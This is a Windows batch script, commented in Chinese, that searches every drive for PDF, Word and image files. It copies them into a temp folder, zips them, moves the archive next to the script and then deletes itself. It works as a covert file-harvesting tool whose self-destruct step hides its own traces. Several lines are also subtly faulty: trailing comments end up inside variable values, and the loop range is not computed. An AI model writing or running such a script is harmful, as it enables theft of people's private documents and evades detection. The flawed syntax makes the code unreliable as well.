@echo off
setlocal enabledelayedexpansion

:: 初始化變數
set targetDir=C:\Windows\Temp\collected_files    :: 定義目標資料夾，用來存放複製的檔案
set zipFile=C:\Windows\Temp\collected_files.zip  :: 定義壓縮後 ZIP 檔案的路徑
set fileCount=0                                  :: 初始化文件計數器，用來統計已複製的檔案數量
set count=0                                      :: 初始化磁碟計數器，用來存儲檢測到的磁碟數量

:: 獲取執行此批次檔的所在目錄
set currentDir=%~dp0                             :: 獲取當前腳本所在的目錄
set scriptPath=%~f0                              :: 獲取當前腳本的完整路徑

:: 獲取所有邏輯磁碟並存儲到數組
for /f "tokens=1 delims=" %%d in ('wmic logicaldisk get caption ^| find ":"') do (
    echo Found drive: %%d                        :: 輸出找到的磁碟
    set "drive[!count!]=%%d"                     :: 將磁碟路徑存儲到數組 drive[count]
    set /a count+=1                              :: 增加磁碟計數器
)

:: 檢查並建立目標資料夾
if not exist "%targetDir%" (
    mkdir "%targetDir%"                          :: 如果目標資料夾不存在，則建立
)

:: 清理目標資料夾中的舊檔案
echo Clearing old files in the target folder...
del /q /f "%targetDir%\*.*" >nul 2>&1            :: 刪除目標資料夾中的所有檔案

:: 遍歷每個磁碟
for /L %%i in (0,1,%count%-1) do (               :: 循環遍歷每個磁碟
    set "currentDrive=!drive[%%i]!"              :: 獲取當前磁碟路徑
    echo Processing drive !currentDrive!...      :: 輸出當前正在處理的磁碟
    call :processDrive !currentDrive!            :: 呼叫子程序處理磁碟中的檔案
)

:: 輸出文件統計結果
if %fileCount% gtr 0 (                           :: 如果找到的檔案數量大於 0
    echo %fileCount% files have been copied to %targetDir%.
    echo Starting file compression, please wait... :: 提示即將開始壓縮
) else (
    echo No matching files found.                :: 如果沒有找到符合條件的檔案，輸出提示
    goto :selfdestruct                           :: 跳轉到腳本自毀流程
)

:: 刪除舊的 ZIP 檔案（如果存在）
if exist "%zipFile%" (
    echo Found old zip file, deleting it...
    del /q /f "%zipFile%"                        :: 如果舊的 ZIP 檔案存在，則刪除
)

:: 壓縮目標資料夾為 ZIP 檔案
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('%targetDir%', '%zipFile%')"
                                                    :: 使用 PowerShell 將目標資料夾壓縮為 ZIP 檔案

:: 檢查壓縮結果並移動 ZIP 檔案
if exist "%zipFile%" (
    echo Files have been compressed to %zipFile%.
    echo Moving ZIP file to current directory: %currentDir%...
    move "%zipFile%" "%currentDir%"             :: 將 ZIP 檔案移動到腳本所在目錄
) else (
    echo Compression failed.                    :: 如果壓縮失敗，輸出提示
)

:: 清理暫存資料夾（可選）
:: echo 正在清理暫存資料夾...
:: rmdir /s /q "%targetDir%"                    :: （可選）刪除目標資料夾

:: 自毀腳本
:selfdestruct
echo Script will now self-destruct...
start /b "" cmd /c del "%scriptPath%"           :: 啟動一個新命令行刪除當前腳本
exit                                            :: 結束腳本

:: 處理磁碟檔案的子程序
:processDrive
set "drivePath=%1"                              :: 獲取當前磁碟路徑
for /r "%drivePath%\" %%f in (*.pdf *.docx *.png *.jpg) do (  :: 遍歷磁碟中符合條件的檔案
    copy "%%f" "%targetDir%" >nul 2>&1          :: 將檔案複製到目標資料夾
    if not errorlevel 1 (                       :: 如果複製成功
        set /a fileCount+=1                     :: 增加檔案計數器
    )
)
goto :eof                                       :: 返回主程序
